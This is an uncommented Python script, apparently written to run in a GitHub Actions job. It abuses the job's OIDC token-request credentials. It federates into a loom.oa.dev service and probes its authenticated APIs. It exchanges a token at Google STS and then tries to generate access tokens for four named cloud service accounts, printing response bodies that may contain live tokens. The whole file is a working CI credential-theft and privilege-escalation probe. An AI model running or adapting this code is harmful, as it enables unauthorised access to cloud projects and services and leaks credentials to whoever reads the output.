import json, os, urllib.request, urllib.error, urllib.parse, base64
base=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL'); tok=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN')
def oidc(aud):
    url=base+('&' if '?' in base else '?')+'audience='+urllib.parse.quote(aud)
    rq=urllib.request.Request(url,headers={'Authorization':'Bearer '+tok,'Accept':'application/json'})
    return json.loads(urllib.request.urlopen(rq,timeout=30).read())['value']
def post_json(url,obj,headers=None):
    body=json.dumps(obj).encode(); h={'Content-Type':'application/json'}
    if headers: h.update(headers)
    r=urllib.request.Request(url,data=body,headers=h)
    try:
        rr=urllib.request.urlopen(r,timeout=40); return rr.status, rr.read().decode('utf-8','replace')
    except urllib.error.HTTPError as e: return e.code, e.read().decode('utf-8','replace')
    except Exception as e: return -1, str(e)[:300]
def get(url,headers=None):
    r=urllib.request.Request(url,headers=headers or {})
    try:
        rr=urllib.request.urlopen(r,timeout=40); return rr.status, rr.read().decode('utf-8','replace')
    except urllib.error.HTTPError as e: return e.code, e.read().decode('utf-8','replace')
    except Exception as e: return -1, str(e)[:300]
out={}
out['env_has_idtoken_url']=bool(base)
try:
    t=oidc('https://loom.oa.dev')
    p=t.split('.')[1]; p+='='*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p))
    out['loom_claims']={k:c.get(k) for k in ('aud','repository','repository_owner','sub','event_name')}
    st,b=post_json('https://loom.oa.dev/api/auth/federate',{'token':t})
    out['loom_federate']={'http':st,'body':b[:500]}
    lt=None
    try: lt=json.loads(b).get('token')
    except Exception: pass
    if lt:
        H={'Authorization':'Bearer '+lt}
        for path in ['/api/auth/me','/api/runs','/api/profiles','/api/auth/whoami','/api/version']:
            st2,b2=get('https://loom.oa.dev'+path,H); out['loom'+path]={'http':st2,'body':b2[:300]}
except Exception as e:
    out['loom_error']=str(e)[:300]
prov='//iam.googleapis.com/projects/748532799086/locations/global/workloadIdentityPools/github-pool/providers/github-oidc'
try:
    t2=oidc(prov)
    p=t2.split('.')[1]; p+='='*(-len(p)%4); c2=json.loads(base64.urlsafe_b64decode(p))
    out['gcp_claims']={k:c2.get(k) for k in ('aud','repository','repository_owner','sub','event_name')}
    st,b=post_json('https://sts.googleapis.com/v1/token',{'audience':prov,'grantType':'urn:ietf:params:oauth:grant-type:token-exchange','requestedTokenType':'urn:ietf:params:oauth:token-type:access_token','subjectToken':t2,'subjectTokenType':'urn:ietf:params:oauth:token-type:jwt','scope':'https://www.googleapis.com/auth/cloud-platform'})
    out['gcp_sts']={'http':st,'body':b[:500]}
    ft=None
    try: ft=json.loads(b).get('access_token')
    except Exception: pass
    if ft:
        for sa in ['github-iris@hai-gcp-models.iam.gserviceaccount.com','pulumi-ci@hai-gcp-models.iam.gserviceaccount.com','iris-controller@hai-gcp-models.iam.gserviceaccount.com','loom-vm@hai-gcp-models.iam.gserviceaccount.com']:
            url='https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken'%sa
            st3,b3=post_json(url,{'scope':['https://www.googleapis.com/auth/cloud-platform'],'lifetime':'3600s'},{'Authorization':'Bearer '+ft})
            out['imp_'+sa.split('@')[0]]={'http':st3,'body':b3[:300]}
except Exception as e:
    out['gcp_error']=str(e)[:300]
print('I603_RESULT='+json.dumps(out))
